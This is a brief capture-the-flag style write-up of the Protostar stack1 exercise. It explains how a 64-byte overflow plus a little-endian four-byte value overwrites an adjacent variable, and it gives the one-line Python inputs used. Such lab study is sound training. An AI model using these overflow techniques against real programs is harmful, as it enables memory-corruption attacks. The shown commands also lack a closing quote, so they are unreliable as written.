## Description

[Problem source](https://exploit-exercises.com/protostar/stack1/)

### Solution

This problem is similar to the first one, but in this case we have to
modify the variable to a special value `0x61626364`.
Like in the previous level, `buffer` and `modified` variables  are located next to
each other in the memory. The only thing that we have to take into
consideration is the endianness of our system.
	
	python -c "print('a' * 64 + 'abcd') | xargs ./stack1

This won't work because our system is little endian. 'abcd' will be interpreted
as 0x64636261 by the cpu. So we have to to provide the 'abcd' string in the
reverse order.

	python -c "print('a' * 64 + 'dcba') | xargs ./stack1
